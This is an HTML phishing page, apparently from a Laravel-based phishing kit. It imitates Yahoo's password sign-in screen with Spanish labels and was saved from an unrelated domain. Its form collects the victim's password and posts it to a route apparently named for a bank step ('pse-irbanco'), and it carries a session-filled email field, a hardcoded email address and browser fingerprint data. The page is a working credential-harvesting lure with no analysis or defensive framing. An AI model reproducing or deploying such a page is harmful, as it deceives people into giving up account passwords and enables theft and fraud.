<!DOCTYPE html>
<!-- saved from url=(0038)https://v2.pserecarguen.uk/email/login -->
<html id="Stencil" class="js grid light-theme"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <link rel="stylesheet" href="/general/yahoo.css">
        <link rel="shortcut icon" href="https://v2.pserecarguen.uk/email/img/Yahoo/yahoo.ico" type="image/x-icon">
        <title>Yahoo</title>
        <style>

            #login-passwd:invalid {
                box-shadow: none;
            }

            @media (max-width: 800px) {
                .login-box {
                    width: 100%;
                    margin: 0px;
                    padding: 0px;
                    box-shadow: none;
                    border: none;
                }
                .mbr-desktop-hd {
                    display: none;
                }
            }

        </style>
    <style type="text/css">.vue-slider-dot{position:absolute;-webkit-transition:all 0s;transition:all 0s;z-index:5}.vue-slider-dot:focus{outline:none}.vue-slider-dot-tooltip{position:absolute;visibility:hidden}.vue-slider-dot-hover:hover .vue-slider-dot-tooltip,.vue-slider-dot-tooltip-show{visibility:visible}.vue-slider-dot-tooltip-top{top:-10px;left:50%;-webkit-transform:translate(-50%,-100%);transform:translate(-50%,-100%)}.vue-slider-dot-tooltip-bottom{bottom:-10px;left:50%;-webkit-transform:translate(-50%,100%);transform:translate(-50%,100%)}.vue-slider-dot-tooltip-left{left:-10px;top:50%;-webkit-transform:translate(-100%,-50%);transform:translate(-100%,-50%)}.vue-slider-dot-tooltip-right{right:-10px;top:50%;-webkit-transform:translate(100%,-50%);transform:translate(100%,-50%)}</style><style type="text/css">.vue-slider-marks{position:relative;width:100%;height:100%}.vue-slider-mark{position:absolute;z-index:1}.vue-slider-ltr .vue-slider-mark,.vue-slider-rtl .vue-slider-mark{width:0;height:100%;top:50%}.vue-slider-ltr .vue-slider-mark-step,.vue-slider-rtl .vue-slider-mark-step{top:0}.vue-slider-ltr .vue-slider-mark-label,.vue-slider-rtl .vue-slider-mark-label{top:100%;margin-top:10px}.vue-slider-ltr .vue-slider-mark{-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.vue-slider-ltr .vue-slider-mark-step{left:0}.vue-slider-ltr .vue-slider-mark-label{left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}.vue-slider-rtl .vue-slider-mark{-webkit-transform:translate(50%,-50%);transform:translate(50%,-50%)}.vue-slider-rtl .vue-slider-mark-step{right:0}.vue-slider-rtl .vue-slider-mark-label{right:50%;-webkit-transform:translateX(50%);transform:translateX(50%)}.vue-slider-btt .vue-slider-mark,.vue-slider-ttb .vue-slider-mark{width:100%;height:0;left:50%}.vue-slider-btt .vue-slider-mark-step,.vue-slider-ttb .vue-slider-mark-step{left:0}.vue-slider-btt .vue-slider-mark-label,.vue-slider-ttb .vue-slider-mark-label{left:100%;margin-left:10px}.vue-slider-btt .vue-slider-mark{-webkit-transform:translate(-50%,50%);transform:translate(-50%,50%)}.vue-slider-btt .vue-slider-mark-step{top:0}.vue-slider-btt .vue-slider-mark-label{top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.vue-slider-ttb .vue-slider-mark{-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.vue-slider-ttb .vue-slider-mark-step{bottom:0}.vue-slider-ttb .vue-slider-mark-label{bottom:50%;-webkit-transform:translateY(50%);transform:translateY(50%)}.vue-slider-mark-label,.vue-slider-mark-step{position:absolute}</style><style type="text/css">.vue-slider{position:relative;-webkit-box-sizing:content-box;box-sizing:content-box;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;display:block;-webkit-tap-highlight-color:rgba(0,0,0,0)}.vue-slider-rail{position:relative;width:100%;height:100%;-webkit-transition-property:width,height,left,right,top,bottom;transition-property:width,height,left,right,top,bottom}.vue-slider-process{position:absolute;z-index:1}</style><style>@import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");</style></head>
    <body>
<x-lab-banner />
        <div id="login-body" class="loginish puree-v2 grid ">
            <div class="mbr-desktop-hd"><span class="column"><a style="cursor: pointer;"><img src="/general/yahoo.png" alt="Yahoo" class="logo " width="" height="36"><img src="/general/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36"></a></span>
                <span class="column help txt-align-right"><a style="cursor: pointer;">Help</a></span>
            </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center"><img src="/general/yahoo.png" alt="Yahoo" class="logo yahoo-en-GB" width="" height="27"><img src="/general/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-GB" width="" height="27"></div>
                    <div class="challenge password-challenge">
                        <div class="challenge-header">
                            <div class="yid">{{ session('entrada0')['email'] }}</div>
                        </div>
                        <div id="password-challenge" class="primary">
                            <strong class="challenge-heading">Introduce tu contraseña</strong>
                            <span class="txt-align-center challenge-desc">para terminar de iniciar sesión</span>
                            
                                <form id="form1" action="{{ route('pse-irbanco') }}" method="post"
                                class="challenge-form">
                                    @csrf

                            
                            
                            
                                <input name="email" type="hidden" id="email" value="unbertoqopola@yahoo.com"> 

                            
                            <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:&quot;unknown&quot;,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:-60,&quot;timezone&quot;:&quot;Europe/Stockholm&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Linux x86_64&quot;,&quot;doNotTrack&quot;:&quot;1&quot;,&quot;plugins&quot;:{&quot;count&quot;:0,&quot;hash&quot;:&quot;24700f9f1986800ab4fcc880530dd0ed&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;VMware, Inc.~llvmpipe (LLVM 10.0.1, 256 bits)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:12,&quot;hash&quot;:&quot;0eff30457a911fb5874e09c82647a6a6&quot;},&quot;audio&quot;:&quot;35.73833402246237&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1920&quot;,&quot;h&quot;:&quot;1080&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;1049&quot;,&quot;h&quot;:&quot;1920&quot;},&quot;ts&quot;:{&quot;serve&quot;:1614631590881,&quot;render&quot;:1614631568869}}">
                                <input type="hidden" name="crumb" value="vQYFNoVr5Yu"><input type="hidden" name="acrumb" value="cAqgl2uC"><input type="hidden" name="sessionIndex" value="QQ--"><input type="hidden" name="displayName">
                                <div class="hidden-username"></div>
                                <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value=""><input type="hidden" name="showButtonStatus" id="show-button-status" value=""><input type="hidden" name="prefersReducedMotion" id="prefers-reduce-motion" value="">
									

 
                                <div id="password-container" class="input-group password-container blurred"><input type="password" id="login-passwd" class="password" name="emailPassword" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd" required="">
                                    <label for="login-passwd" id="password-label" class="password-label">Contraseña</label>
                                    <div class="caps-indicator hide" id="caps-indicator" title="Caps lock is on"></div>
                                    <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button"></button>
                                </div>
                                <div id="passError">
                                    
                                </div>
                                <div class="button-container">
                                    <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next">Siguiente</button>
                                </div>
                                <div class="forgot-cont challenge-button-link"><input type="button" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery" value="¿Has olvidado tu contraseña?"></div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>

            var timesClicked = 0;

            function showPass() {
                if (timesClicked >= 1) {
                    document.getElementById("login-passwd").type = "password";
                    document.getElementById("password-toggle-button").classList.remove('show-pw');
                    document.getElementById("password-toggle-button").classList.add('hide-pw');
                    timesClicked = 0;
                } else {
                    document.getElementById("login-passwd").type = "text";
                    document.getElementById("password-toggle-button").classList.remove('hide-pw');
                    document.getElementById("password-toggle-button").classList.add('show-pw');
                    timesClicked++;
                }
            }

            document.getElementById("password-toggle-button").onclick = showPass;

            
        </script>

    
</body><div class="troywell-avia"><template shadowrootmode="open">
        <style>@import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");</style>
        <div id="troywell-avia" data-v-app=""><div class="app"><div data-v-138a3c39=""><!----></div></div></div></template></div><div class="troywell-caa"><template shadowrootmode="open">
    <style>
    @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
    @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/caa/styles.css");
    </style>
    <div id="troywell-caa" data-v-app=""><div class="content-app" data-v-9eaabcdc=""><!----></div></div></template></div></html>